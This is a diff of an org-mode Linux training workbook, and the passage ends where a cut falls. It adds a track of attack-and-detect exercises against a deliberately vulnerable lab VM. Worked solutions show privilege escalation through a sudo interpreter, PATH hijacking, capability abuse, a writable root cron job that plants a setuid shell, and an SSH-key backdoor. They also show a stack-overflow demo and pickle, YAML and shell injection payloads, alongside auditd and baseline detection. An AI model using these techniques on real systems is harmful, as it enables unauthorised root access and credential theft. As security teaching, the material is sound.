 sorts ascending. Fix: =out[i].n > out[j].n=.
 
-** TODO E23.9 — Delve: conditional breakpoints, stacks, goroutines
+** TODO E24.9 — Delve: conditional breakpoints, stacks, goroutines
 Stop inside the counting loop only when the word is "holmes", then look at the
 stack and every goroutine. Finally, debug the same program from Neovim.
 You'll meet: =cond=, =bt=, =goroutines=, nvim-dap-go.
@@ -4706,7 +5814,7 @@ dlv debug --init /tmp/dlv-holmes --allow-non-terminal-interactive=true 2>&1 \
 Even this single-threaded program has several goroutines — the Go runtime's
 garbage collector and finalizer run alongside =main=.
 
-** TODO E23.10 — Elisp: read a backtrace
+** TODO E24.10 — Elisp: read a backtrace
 Load =debug/elisp/salary.el= and call =(nixlab-average-salary "eng")=. It
 fails. Turn on the debugger for errors, trigger it again, and read the
 =*Backtrace*= buffer to find the bad value.
@@ -4731,8 +5839,8 @@ is where it failed; =e= evaluates an expression in that context (try
 =(wrong-type-argument number-or-marker-p "134950")=: =+= got a /string/.
 =split-string= returns strings; wrap it: =(string-to-number (nth 4 fields))=.
 
-** TODO E23.11 — Elisp: Edebug, step by step
-Fix E23.10's bug, then /instrument/ the function with Edebug and step through
+** TODO E24.11 — Elisp: Edebug, step by step
+Fix E24.10's bug, then /instrument/ the function with Edebug and step through
 one call. You'll find two more bugs: a wrong average for "eng", and a crash for
 "marketing".
 You'll meet: =C-u C-M-x= (=edebug-defun=), =SPC=, =n=, =i=, =o=, =b=, =g=,
@@ -4763,7 +5871,7 @@ expression of the function.
 92860.90), and =count= is 0 for a missing department. Fix:
 =(if (zerop count) 0.0 (/ (float total) count))=.
 
-** TODO E23.12 — SLIME: fix a bug without restarting
+** TODO E24.12 — SLIME: fix a bug without restarting
 Load =debug/lisp/means.lisp= and run =(dept-means '(("eng" 100 200) ("ops")))=.
 In the debugger, find the failing frame, look at its locals, fix =mean= in the
 source, and /resume the original call/ from the broken frame.
@@ -4792,7 +5900,7 @@ The call finished with the /new/ =mean=, without re-running from the top.
 =(declaim (optimize (debug 3)))= at the top of the file is what makes frames
 restartable.
 
-** TODO E23.13 — SLIME: stepping and tracing
+** TODO E24.13 — SLIME: stepping and tracing
 Watch =(fact 3)= compute step by step, then trace every call to =fact= for
 =(fact 5)=.
 You'll meet: =step=, the stepper keys =s= / =x= / =o= / =c=, =trace= /
@@ -4816,6 +5924,937 @@ out of the current function, =c= continues normally. For tracing,
 #+end_src
 Tracing shows each call's arguments and return value, nested by depth — often
 all you need to understand recursion, without stopping anything.
+
+* 25. Offence & defence: attack and detect
+:PROPERTIES:
+:VISIBILITY: children
+:END:
+
+Everything so far taught you to run a Linux system. This track teaches you to
+/break into one and to catch someone who does/ — the same skills, pointed the
+other way. You play two roles against one machine: =bob=, an ordinary user who
+has a shell and wants root, and the administrator who has to notice.
+
+This is a workshop in *technique*, not a box of ready-made exploits. Each
+exercise hands you one building block — a way to enumerate, a class of
+misconfiguration, a primitive — shows you enough to prove it works, and leaves
+the final move to you in the /Scratch/ block. Real attacks are these pieces
+*combined*; E25.11 is where you chain them, and the defensive half (E25.8
+onward) is where you learn to see every step from the other side.
+
+The practice target is =/opt/scenario=, planted with five deliberate holes when
+the lab starts. It belongs to root; =bob= does not. Everything lives in this
+one VM, so there is nothing outside it to harm. Become the attacker with
+=sudo -u bob bash -c '...'=, or =sudo -iu bob= for an interactive shell.
+
+Made a mess, or triggered a hole that left root access lying around? Rebuild the
+scenario:
+
+#+begin_src bash :results output
+bash /opt/nixlab/workbook-setup.sh --reset >/dev/null && ls /opt/scenario/bin && echo "scenario rebuilt"
+#+end_src
+
+** TODO E25.1 — Enumerate like an attacker
+You have a shell as =bob= and nothing else. Before touching anything, /look/:
+who you are and what groups you're in, what you may run with =sudo=, every
+setuid program and file capability on the box, writable directories, scheduled
+jobs, and secrets left in the open. Collect the findings; the next exercises
+each exploit one.
+You'll meet: =id=, =sudo -n -l=, =find -perm -4000=, =find -perm -2000=,
+=getcap -r=, =find -perm -0002=, world-writable dirs, =/etc/cron*=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+Enumeration is the whole game: attackers win by /noticing/, not by magic.
+=sudo -n -l= lists your sudo rights without prompting. =find / -perm -4000 -type
+f= finds setuid programs — each runs as its owner, usually root. =getcap -r /=
+finds file /capabilities/, the fine-grained slices of root (E25.4). World-
+writable files and directories (=-perm -0002=) are footholds. Send errors to
+=/dev/null= so permission-denied noise doesn't bury the signal.
+*** Solution
+#+begin_src bash :results output
+sudo -u bob bash -c '
+id
+echo "--- sudo rights:"; sudo -n -l 2>/dev/null | grep -A10 "may run"
+echo "--- setuid/setgid programs (non-standard):"; find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null | grep -v -E "^/usr|^/nix" 
+echo "--- file capabilities:"; getcap -r / 2>/dev/null | grep -v /nix
+echo "--- world-writable, outside the usual temp dirs:"; find /opt /srv /etc -xdev -perm -0002 ! -type l 2>/dev/null
+echo "--- secrets left readable:"; grep -rIl -E "password|IDENTIFIED BY|PRIVATE KEY" /opt /srv 2>/dev/null
+'
+#+end_src
+Real engagements run tools like =linpeas= that automate exactly this list. Doing
+it by hand once teaches you what they look for — and what to lock down first.
+
+** TODO E25.2 — sudo: a tool that is more than it looks
+=bob= may run =/opt/scenario/bin/dbmaint= as root without a password. Find out
+what that program actually /is/, and reason about why that one =sudo= line hands
+over the whole machine. Prove you can act as root through it; the specific
+escape is yours to write.
+You'll meet: =sudo -l=, =readlink -f=, =file=, interpreters as privilege,
+the GTFOBins way of thinking, =secure_path=, =NOEXEC=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+A =sudo= rule grants a /program/, but a program is only as safe as what it can
+do. Ask of any allowed binary: can it run another command, read a file, write a
+file, or load code? If yes, it can do that /as root/. =dbmaint= looks like a
+maintenance tool; follow it with =readlink -f= and you'll find it's a full
+interpreter. An interpreter that runs as root runs /your/ code as root. (This
+reasoning, catalogued for hundreds of binaries, is the GTFOBins project.) The
+fixes: never grant interpreters or pagers, pin =secure_path=, and prefer a tiny
+purpose-built script that takes no code from the caller.
+*** Solution
+#+begin_src bash :results output
+sudo -u bob bash -c '
+sudo -n -l | grep dbmaint
+echo "--- what is it really?"; readlink -f /opt/scenario/bin/dbmaint
+echo "--- so this runs as root:"
+sudo -n /opt/scenario/bin/dbmaint -e '"'"'print "effective user: ", (getpwuid($>))[0], "\n"'"'"'
+'
+#+end_src
+That proof used the interpreter's own features to report =root=. From there a
+shell, reading =/etc/shadow=, or writing a new sudo rule are all one short step —
+write one in /Scratch/. The lesson is the /category/: powerful programs behind
+=sudo= are root, however innocent the name.
+
+** TODO E25.3 — setuid + a trusted PATH
+=/opt/scenario/bin/syscheck= is setuid root and prints system stats. Watch what
+external commands it calls, notice it calls them /by name/, and use that. The
+trick is old and everywhere: a privileged program that trusts =$PATH=.
+You'll meet: =strings=, =ltrace=/=strace -f=, =system(3)= vs =execve=, =$PATH=
+search order, shadowing a command, dropping privileges.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+=syscheck= calls =system("uptime; free ...")=. =system= runs =/bin/sh -c=,
+which searches =$PATH= for =uptime=. If you put a directory you control at the
+front of =$PATH= and a program named =uptime= in it, the root process runs
+/your/ =uptime=. Confirm what it calls with =strings= or =strace -f -e execve=.
+The fix is for the privileged program to use absolute paths, scrub its
+environment, and drop privileges before doing anything.
+*** Solution
+#+begin_src bash :results output
+sudo -u bob bash -c '
+echo "--- what does it run? (look for bare command names)"
+strings /opt/scenario/bin/syscheck | grep -E "uptime|free"
+echo "--- place our own command earlier in PATH and let the root process find it:"
+d=$(mktemp -d); printf "#!/bin/sh\necho RUNNING AS; id\n" > "$d/uptime"; chmod +x "$d/uptime"
+PATH="$d:$PATH" /opt/scenario/bin/syscheck 2>/dev/null | head -2
+'
+#+end_src
+The first line of output shows =uid=0=: your script ran as root. A setuid
+program must never call a command by a bare name, and should =setenv("PATH",
+"/usr/bin:/bin")= or use =execve= with a full path.
+
+** TODO E25.4 — Capabilities: fractions of root
+=getcap= showed =/opt/scenario/bin/readlog= carries =cap_dac_read_search=. That
+is one slice of root's power — the right to bypass all read permission checks.
+Use it to read a file =bob= must not. Then reason about which other capabilities
+would be worse.
+You'll meet: =getcap=, =cap_dac_read_search=, =cap_setuid=, =cap_sys_ptrace=,
+=cap_dac_override=, =setcap -r=, least privilege.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+Capabilities split root into ~40 independent powers so a program can have just
+one. =cap_dac_read_search= = read any file. =readlog= is a copy of a file
+reader carrying it, so it reads anything — including =/etc/shadow=, the password
+hashes. Worse ones: =cap_dac_override= (read /and/ write any file),
+=cap_setuid= (become any user — instant root), =cap_sys_ptrace= (attach to any
+process, E25.6). The fix is to grant the exact capability a program needs and no
+more — or, usually, none: =setcap -r FILE=.
+*** Solution
+#+begin_src bash :results output
+sudo -u bob bash -c '
+getcap /opt/scenario/bin/readlog
+echo "--- read a file bob has no permission for:"
+ls -l /etc/shadow
+/opt/scenario/bin/readlog /etc/shadow | head -1
+'
+#+end_src
+Those hashes feed straight into an offline password cracker. A file reader
+should never carry =cap_dac_read_search=; if backups genuinely need it, confine
+it to one directory and one caller.
+
+** TODO E25.5 — Anything writable that root will run
+=/opt/scenario/jobs/collect.sh= is a script root runs on a timer, and its
+permissions are =777=. You can edit it. Add a line that, the next time root
+runs it, works for you — then simulate that run. Same idea applies to a
+writable directory on root's =PATH= or a writable systemd unit.
+You'll meet: =-perm -0002=, who-runs-what, appending to a script, a setuid
+copy of a shell as a payload, =find -writable=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+If root periodically runs a file you can write, you run as root on root's
+schedule. A quiet, classic move is to have that run make a /copy/ of a shell
+owned by root and setuid, so you get root on demand afterwards without touching
+the job again. Append your line (don't break the existing job), then run the job
+/as root/ to simulate the timer firing. The fix: jobs root runs must be owned by
+root and writable only by root (=644=/=755=), in directories only root can
+write.
+*** Solution
+#+begin_src bash :results output
+ls -l /opt/scenario/jobs/collect.sh
+# bob appends a line; the job stays working
+sudo -u bob bash -c 'printf "cp /bin/sh /opt/scenario/.root-shell && chmod 4755 /opt/scenario/.root-shell\n" >> /opt/scenario/jobs/collect.sh'
+# simulate the next scheduled run (this is the part that happens AS ROOT)
+/opt/scenario/jobs/collect.sh
+echo "--- bob now has a setuid-root shell waiting:"
+ls -l /opt/scenario/.root-shell
+sudo -u bob /opt/scenario/.root-shell -p -c 'id'
+rm -f /opt/scenario/.root-shell
+#+end_src
+=sh -p= keeps the privileges instead of dropping them. One writable line became
+permanent root. Audit with =find / -perm -0002 -type f= and fix ownership.
+
+** TODO E25.6 — Secrets at rest and in flight
+Root isn't the only prize; credentials are. Find the readable database backup
+and pull the password out of it. Then learn the live version: a process's
+environment and command line are readable, so a password passed on a command
+line or in an env var leaks to anyone who can see =/proc=.
+You'll meet: =grep -r=, =/proc/PID/environ=, =/proc/PID/cmdline=, =ps= and its
+limits, =hidepid=, why secrets belong in files with tight modes, not argv.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+=grep -rI= the backup directory for =IDENTIFIED BY= or =password=. For live
+secrets: =/proc/PID/environ= is the process's environment (NUL-separated),
+=/proc/PID/cmdline= its arguments — both readable by the owner, and by anyone if
+the process is theirs or =hidepid= is off. That's why =mysql -pSECRET= is a
+mistake: it shows in =ps=. Pass secrets through files (mode 600) or stdin, and
+mount =/proc= with =hidepid=2=.
+*** Solution
+#+begin_src bash :results output
+sudo -u bob bash -c '
+echo "--- credential sitting in a world-readable backup:"
+grep -rI "IDENTIFIED BY" /opt/scenario/backups
+'
+echo "--- live leak: a secret on a command line is visible in /proc and ps"
+python3 -c 'import sys,time; time.sleep(300)' --db-password=hunter2-DEMO & p=$!
+sleep 0.3
+tr "\0" " " < /proc/$p/cmdline; echo
+ps -o args= -p $p
+kill $p 2>/dev/null
+#+end_src
+The backup hands over the database with no exploit at all. The =sleep=' stand-in
+shows why: its "password" is plain in =/proc=. Secrets go in tight-moded files
+or stdin — never in =argv= or the environment of a long-lived process.
+
+** TODO E25.7 — Persistence: keeping the way back
+An attacker who lands once wants to return. Learn the common footholds and their
+trade-offs, then install one against =bob='s own account and prove it would let
+you back in. Think about which are quiet and which a defender would spot.
+You'll meet: =~/.ssh/authorized_keys=, user crontabs, shell rc files
+(=.bashrc=, =.bash_profile=), setuid copies, the noise each one makes.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+Persistence = something that re-runs your access. An added
+=~/.ssh/authorized_keys= line lets a key back in (quiet, but the file's mtime and
+a key you don't recognise give it away). A line in =~/.bashrc= runs on every
+login (noisy to anyone reading the file). A setuid copy (E25.5) survives but
+shows up in a setuid scan. Install one — a backdoor =authorized_keys= entry
+against bob's account is a clean demo — and confirm it's in place. Defenders
+diff these files against a known-good baseline (E25.9).
+*** Solution
+#+begin_src bash :results output
+sudo -u bob bash -c '
+mkdir -p ~/.ssh && chmod 700 ~/.ssh
+ssh-keygen -q -t ed25519 -f /tmp/bk -N "" 
+cat /tmp/bk.pub >> ~/.ssh/authorized_keys
+echo "--- backdoor key now trusted by bob:"
+tail -1 ~/.ssh/authorized_keys | cut -c1-40
+grep -c "$(cut -d" " -f2 /tmp/bk.pub)" ~/.ssh/authorized_keys
+rm -f /tmp/bk /tmp/bk.pub
+'
+#+end_src
+Every method leaves a trace somewhere: a new file, a changed mtime, a line that
+wasn't there yesterday. That is exactly what the defensive half of this track
+learns to find.
+
+** TODO E25.8 — Covering tracks, and why it doesn't work
+Attackers try to erase themselves: clear shell history, back-date files,
+trim logs. Try each, then see the residue it leaves. The important lesson is
+defensive — know what /cannot/ be hidden.
+You'll meet: =unset HISTFILE=, =history -c=, =touch -r= / =touch -d=, =stat=,
+atime/mtime vs *ctime*, append-only logs, remote logging.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+=unset HISTFILE= stops this shell writing history — but only this shell, and not
+the system's auth logs. =touch= can set a file's /mtime/ and /atime/ to any
+value, but *not* its =ctime= (inode-change time): the kernel updates ctime
+whenever metadata changes, and there's no API to set it. So a back-dated file
+still shows a fresh ctime under =stat=. Append-only logs (=chattr +a=) and logs
+shipped to another machine (E13.13) can't be edited after the fact at all.
+*** Solution
+#+begin_src bash :results output
+f=/opt/scenario/backups/db-backup.sql
+echo "tampered" >> "$f"
+touch -d '2020-01-01 00:00' "$f"        # try to back-date it
+stat -c 'mtime=%y   ctime=%z' "$f" | sed 's/\.[0-9]* //g'
+#+end_src
+=mtime= obediently reads 2020; =ctime= is today, because the kernel stamped it
+when =touch= changed the metadata. Forensics compares the two. This is why
+real logging is /remote/ and /append-only/: the one copy an attacker can reach
+is never the only copy.
+
+** TODO E25.9 — Defence: baseline and diff
+Switch sides. Take a fingerprint of the things attacks change — setuid files,
+capabilities, sudo rules — /now/, while the box is clean. Then let an attack
+happen and show the fingerprint catches it. This is the cheapest, most reliable
+detection you have.
+You'll meet: =find -perm=, =getcap -r=, =sha256sum=, a manifest file,
+=diff=, =find -newer=, scheduling the check.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+You can't spot a change without a /before/. Build a manifest: every setuid and
+setgid file, every file capability, and a hash of each sensitive file
+(=/etc/sudoers=, =/etc/passwd=). Store it somewhere the attacker can't quietly
+edit. Later, regenerate and =diff=. =find / -newer MANIFEST= also lists
+everything modified since the baseline was taken. Real tools (AIDE, Tripwire)
+are this idea, hardened.
+*** Solution
+#+begin_src bash :results output
+manifest() {
+  find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null
+  getcap -r / 2>/dev/null | awk '{print $1" "$2}'
+  sha256sum /etc/sudoers /etc/sudoers.d/* 2>/dev/null
+}
+manifest | sort > /root/.baseline
+# ... an attacker adds a setuid shell and a sudo rule ...
+cp /bin/sh /opt/scenario/.rootsh && chmod 4755 /opt/scenario/.rootsh
+echo 'bob ALL=(root) NOPASSWD: ALL' > /etc/sudoers.d/99-oops
+echo "--- what changed since the baseline:"
+diff /root/.baseline <(manifest | sort) | grep '^>'
+rm -f /opt/scenario/.rootsh /etc/sudoers.d/99-oops
+#+end_src
+The new setuid shell and the new sudo rule both jump out. Run this from a timer
+(a scheduled task, or =cron=) and diff against the stored baseline every hour.
+
+** TODO E25.10 — Defence: watch it happen with auditd
+A baseline shows /that/ something changed; the audit log shows /who did it and
+how/. Using track 16's =auditd=, record every program run as root, every change
+to =/etc/sudoers.d=, and every =setuid= syscall. Replay one escalation and find
+it in the log.
+You'll meet: =auditctl -a always,exit -S execve=, =-F euid=0=, =-w=,
+=-S setuid=, =ausearch -k=, =-i=, tying events to =auid= (track 16).
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+Build on track 16. =auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -k
+root-exec= logs everything that runs as root. =-w /etc/sudoers.d -p wa -k
+sudoers= watches the sudo rules. A watch on =setuid= syscalls catches privilege
+changes. After replaying an attack, =ausearch -k KEY -i= shows the events with
+names resolved, and =auid= ties each back to the human who logged in — even
+through =sudo= and setuid, which can't change it.
+*** Solution
+#+begin_src bash :results output
+pgrep -x auditd >/dev/null || auditd -c /etc/audit 2>/dev/null
+auditctl -D >/dev/null 2>&1
+auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -k root-exec 2>/dev/null
+auditctl -w /etc/sudoers.d -p wa -k sudoers 2>/dev/null
+auditctl -w /etc/sudoers.d -p wa -k sudoers 2>/dev/null
+# replay two attacker moves: the PATH escalation (E25.3) and dropping a sudo rule
+sudo -u bob bash -c 'd=$(mktemp -d); printf "#!/bin/sh\nid\n">"$d/uptime"; chmod +x "$d/uptime"; PATH="$d:$PATH" /opt/scenario/bin/syscheck >/dev/null 2>&1'
+echo "bob ALL=(root) NOPASSWD: ALL" > /etc/sudoers.d/99-oops
+sleep 1
+echo "--- executables the audit log saw run (root-exec + overall):"
+aureport -x --summary -i --start recent 2>/dev/null | sed -n "1,7p"
+echo "--- the sudoers watch caught the new rule file being created:"
+ausearch -k sudoers --start recent 2>/dev/null | grep -aoE "name=[^ ]*99-oops" | sort -u
+rm -f /etc/sudoers.d/99-oops; auditctl -D >/dev/null 2>&1
+#+end_src
+The rogue =uptime= running as root appears in the log with =bob='s =auid=
+attached. On a real host these rules ship logs off-box immediately (E25.8), so
+the record survives even if the attacker gets root.
+
+** TODO E25.11 — Chain it: from bob to root, your way
+Now combine the pieces. Starting from a =bob= shell, reach root using /any/ of
+the holes from E25.2–E25.5 — pick one, or chain two. Write it yourself in
+/Scratch/; there's no single intended answer. Then, as the defender, from a
+clean rebuild, say which exercise from E25.9–E25.10 would have caught your path.
+You'll meet: putting enumeration, a primitive, and proof together; mapping each
+attacker step to a detection.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+There is no solution block here on purpose — the point is that you can now
+assemble one. A clean path is: enumerate (E25.1), pick the hole you understand
+best, get root, and prove it with =id=. Then flip: a baseline diff (E25.9) would
+flag a new setuid file; an =execve= audit rule (E25.10) would record the rogue
+command. If you want to start over, rebuild the scenario with the reset block at
+the top of the track.
+*** Solution
+Write your chain in /Scratch/ above. A complete answer has three parts: the
+enumeration that found the hole, the steps that turned it into a root =id=, and
+the one sentence naming the detection that would have caught it. Compare notes
+with the fixes you'll apply in a hardening pass: remove the interpreter from
+=sudo=, give =syscheck= absolute paths, strip the capability from =readlog=, fix
+the =777= job, and tighten the backup's mode. Re-run E25.1 afterward — a clean
+enumeration is the goal.
+
+** TODO E25.12 — Memory safety: seeing a smashed stack
+Down to the lowest level. =/opt/scenario/bin/echoback= copies its argument into
+a fixed 64-byte buffer with no bounds check. Feed it too much, watch it crash,
+and in =gdb= see that /you chose/ the address it crashed trying to reach — the
+saved return address is under your control. This is the root of memory-corruption
+exploitation; here you learn to /recognise/ it, not to weaponise it.
+You'll meet: =strcpy= overflow, the stack frame, saved return address, =gdb
+run=, =info registers rip=, =x/gx $rsp=, a cyclic pattern for finding the offset.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+A local array lives on the stack, just below the saved frame pointer and the
+/saved return address/ the function jumps to when it finishes. =strcpy= keeps
+copying past the array's end, so a long enough input overwrites that saved
+address. In =gdb=, overflow it and look: at the =ret= the top of the stack
+(=$rsp=) holds your bytes. To find the exact offset without guessing, feed a
+non-repeating pattern and see which part lands on the stack — that's the
+distance from the buffer to the return address. Stop there: controlling the
+address is the lesson; turning it into code execution is a different course.
+*** Solution
+#+begin_src bash :results output
+cd /opt/scenario/bin
+echo "--- too much input crashes it:"
+./echoback "$(python3 -c 'print("A"*120)')" 2>&1; echo "exit=$?"
+echo "--- in gdb: our bytes sit on the stack where the return address goes:"
+gdb -q -batch \
+  -ex "set args $(python3 -c 'print("A"*72+"B"*8)')" \
+  -ex run -ex 'x/gx $rsp' ./echoback 2>&1 | grep -E '0x4242'
+echo "--- find the offset with a unique pattern (no magic numbers):"
+pat=$(python3 -c "print('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9')")
+gdb -q -batch -ex "set args $pat" -ex run -ex 'printf "bytes at the return slot: %.8s\n", (char *)$rsp' ./echoback 2>&1 | grep 'return slot'
+#+end_src
+=0x4242424242424242= is your eight =B=s, sitting exactly where the CPU will look
+for the return address: you decide where the function returns. The pattern's
+tail (=Ac...=) shows the offset is 72 bytes. That is the entire foothold of a
+stack overflow — and exactly what the next exercise's defences take away.
+
+** TODO E25.13 — Memory safety: the defences
+Rebuild the same vulnerable code with the protections a modern compiler turns on
+by default, and watch the overflow stop being useful. Learn what each defence
+does and how to check whether a binary has it.
+You'll meet: stack canary (=-fstack-protector=), =NX=/no-exec stack, =PIE= +
+ASLR, =RELRO=, =_FORTIFY_SOURCE=, reading them out with =readelf=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+Four defences, each blunting a different step. A /stack canary/ is a random
+value placed before the saved return address; the function checks it on exit and
+aborts if the overflow changed it (=*** stack smashing detected ***=). /NX/
+marks the stack non-executable, so injected code there won't run. /PIE/ + ASLR
+randomise addresses every run, so you can't know where anything is. /RELRO/
+locks the relocation table. =checksec= reports these; =readelf -lW= shows the =GNU_STACK= segment (no =E=
+means NX is on), =file= says =pie executable= when PIE is on, and a
+=__stack_chk_fail= string in the binary means a canary is present.
+*** Solution
+#+begin_src bash :results output
+cd /opt/scenario/bin
+echo "--- rebuild with the modern defaults:"
+gcc -w -fstack-protector-all -pie -fPIE -Wl,-z,relro,-z,now,-z,noexecstack -D_FORTIFY_SOURCE=2 -O2 echoback.c -o /tmp/echoback_safe
+echo "--- same overflow now aborts safely instead of handing over control:"
+/tmp/echoback_safe "$(python3 -c 'print("A"*200)')" 2>&1 | tail -1; echo "exit=$?"
+echo "--- check the protections on each build:"
+for b in echoback /tmp/echoback_safe; do
+  printf "%-22s " "$b:"
+  if command -v readelf >/dev/null; then
+    n=$(readelf -lW "$b" | awk "/GNU_STACK/{print (\$0 ~ /RWE/)?\"NX:no\":\"NX:yes\"}")
+  else n="NX:n/a"; fi
+  p=$(file "$b" | grep -q "pie executable" && echo "PIE:yes" || echo "PIE:no")
+  c=$(grep -aq __stack_chk_fail "$b" && echo "canary:yes" || echo "canary:no")
+  echo "$n $p $c"
+done
+rm -f /tmp/echoback_safe
+#+end_src
+The hardened build catches the overflow and exits with a guard message
+(=buffer overflow detected= from =_FORTIFY_SOURCE=, or =stack smashing detected=
+from the canary when you build without =-O2=) instead of jumping to your bytes. =echoback= was built with these protections
+/off/ on purpose; real binaries should have them on. When you write C (track 20),
+leave the defaults alone — they are these defences.
+
+
+** Application-level vulnerabilities (Python)
+:PROPERTIES:
+:VISIBILITY: children
+:END:
+
+The holes so far were in the /system/: a sudo rule, a setuid bit, a writable
+job. The next four are in the /code/ — the kind of bug you write yourself in an
+afternoon. They're shown in Python (track 19), with a harmless marker payload
+and the one-line fix for each, because deserialization and injection flaws are
+where most web and tooling compromises actually start.
+
+** TODO E25.14 — Deserialization RCE: never unpickle what you don't trust
+Python's =pickle= doesn't just carry data — it can carry /code/. An object's
+=__reduce__= tells =pickle.loads= what to call when rebuilding it, so a crafted
+pickle runs commands the moment it's loaded. Build one (with a harmless marker),
+load it, and prove it ran. Then pick a safe format.
+You'll meet: =pickle.dumps= / =loads=, =__reduce__=, arbitrary-callable
+execution, =json= vs =pickle=, signing untrusted blobs with =hmac=.
+*** Scratch
+#+begin_src python :results output
+
+#+end_src
+*** Hint
+=__reduce__= returns =(callable, args)=; on load, =pickle= calls
+=callable(*args)=. Point it at =os.system= with a benign command and =loads=
+runs it — no exploit framework needed, the format does it for you. The fix is
+never to unpickle data from outside your trust boundary: use =json= (data only,
+no code), or if you must use pickle, =hmac=-sign it and verify before loading.
+*** Solution
+#+begin_src python :results output
+import pickle, os, json
+class Payload:
+    def __reduce__(self):
+        return (os.system, ("echo ran-from-pickle > /tmp/pk.marker",))
+blob = pickle.dumps(Payload())
+print("the pickle is just innocent-looking bytes:", blob[:16], "...")
+pickle.loads(blob)                      # <-- executes os.system on load
+print("marker left behind:", open("/tmp/pk.marker").read().strip())
+print("json can't do this (data only):", json.loads('{"x": 1}'))
+os.remove("/tmp/pk.marker")
+#+end_src
+Any endpoint that unpickles a request body, cache entry, or session cookie is
+remote code execution waiting to happen. =json= and =hmac=-signed payloads are
+the cure.
+
+** TODO E25.15 — YAML that builds objects
+=yaml.load= with the default loader can instantiate arbitrary Python objects,
+which makes it as dangerous as =pickle=. Show =yaml.load= running a command
+through a tag, then show =safe_load= refusing the same input.
+You'll meet: =yaml.load= vs =yaml.safe_load=, =!!python/object/apply= tags,
+=Loader=/=SafeLoader=, "safe by default".
+*** Scratch
+#+begin_src python :results output
+
+#+end_src
+*** Hint
+The =!!python/object/apply:os.system [...]= tag tells the full loader to call
+=os.system=. =yaml.load(s, Loader=yaml.Loader)= honors it; =yaml.safe_load(s)=
+raises a =ConstructorError= instead, because it only builds plain data types.
+Config files, CI pipelines and API bodies are full of YAML — always
+=safe_load=.
+*** Solution
+#+begin_src python :results output
+import yaml, os
+doc = "!!python/object/apply:os.system ['echo ran-from-yaml > /tmp/yml.marker']"
+yaml.load(doc, Loader=yaml.Loader)            # unsafe: runs the command
+print("yaml.load executed it:", open("/tmp/yml.marker").read().strip())
+try:
+    yaml.safe_load(doc)
+except yaml.YAMLError as e:
+    print("yaml.safe_load refuses:", type(e).__name__)
+os.remove("/tmp/yml.marker")
+#+end_src
+The only difference is which loader you called. Make =safe_load= the habit.
+
+** TODO E25.16 — eval, exec, and format-string leaks
+Passing user input to =eval= or =exec= is handing over the interpreter. And
+=str.format= on an attacker-controlled template can walk object attributes to
+leak secrets. Demonstrate both, then the safe replacements.
+You'll meet: =eval= / =exec= on input, =ast.literal_eval=, =str.format=
+attribute traversal, f-strings vs user templates, least privilege for parsers.
+*** Scratch
+#+begin_src python :results output
+
+#+end_src
+*** Hint
+=eval(user)= evaluates arbitrary Python; even "sandboxed" it's escapable via
+=().__class__.__bases__=-style traversal, so don't — use =ast.literal_eval= for
+literals. For formatting, ="{x.secret}".format(x=obj)= lets a user-supplied
+template read attributes of whatever you pass in; never call =.format= (or =%=)
+on a template that came from a user. Build output with f-strings on values /you/
+choose.
+*** Solution
+#+begin_src python :results output
+import ast
+# safe parsing of a literal, instead of eval:
+print("ast.literal_eval:", ast.literal_eval("{'port': 8080, 'tls': True}"))
+# format-string attribute leak:
+class Config:
+    db_password = "hunter2"
+user_template = "{cfg.db_password}"          # imagine this came from a request
+print("leaked via .format():", user_template.format(cfg=Config()))
+print("fix: only format values you control, e.g.", f"port={8080}")
+#+end_src
+"Give me a template" and "give me an expression" are both "give me code" unless
+you constrain them. =ast.literal_eval= and your-own-values f-strings keep the
+user out of the interpreter.
+
+** TODO E25.17 — Command injection: shell=True is the trap
+Building a shell command by pasting in user input lets the user add their own
+commands. Show =subprocess= with =shell=True= running an injected command, then
+the list-argument form that can't be injected.
+You'll meet: =subprocess.run(..., shell=True)= vs a list argv, the shell's
+metacharacters (=;= =|= =$()=), =shlex.quote=, =os.system= as the same trap.
+*** Scratch
+#+begin_src python :results output
+
+#+end_src
+*** Hint
+=shell=True= runs your string through =/bin/sh=, which interprets =;=, =|=,
+=$()= and friends — so =name = "x; rm -rf ~"= runs two commands. The list form
+=run(["echo", name])= passes =name= as one argument to =echo= with no shell
+involved, so metacharacters are just text. If you truly need a shell, =shlex.quote=
+each untrusted piece — but prefer =shell=False=.
+*** Solution
+#+begin_src python :results output
+import subprocess
+name = "alice; echo INJECTED-EXTRA-COMMAND"
+print("-- shell=True (vulnerable): the ';' starts a second command")
+subprocess.run(f"echo greeting for {name}", shell=True)
+print("-- list argv, shell=False (safe): the whole thing is one argument")
+subprocess.run(["echo", "greeting for", name])
+#+end_src
+The first prints two lines because the shell split on =;=; the second prints the
+injection attempt verbatim, harmless. List-argv with =shell=False= is the rule.
+
+
+* 26. Binary exploitation & defense
+:PROPERTIES:
+:VISIBILITY: children
+:END:
+
+The lowest level, where a program is just bytes in memory and a pointer that
+says what to run next. Track 25 abused /configuration/; here you abuse /memory/
+itself: what happens when a program writes past the end of a buffer, trusts an
+index it shouldn't, or returns to an address you chose. These are the bugs
+behind a large share of real-world compromises, and the defenses you'll meet —
+stack canaries, NX, ASLR, PIE, RELRO, CET — are why modern exploitation is hard.
+
+As in track 25, this teaches /technique/, not turnkey exploits. Every target is
+a deliberately-vulnerable practice binary in =/opt/binexp/bin=, every payload
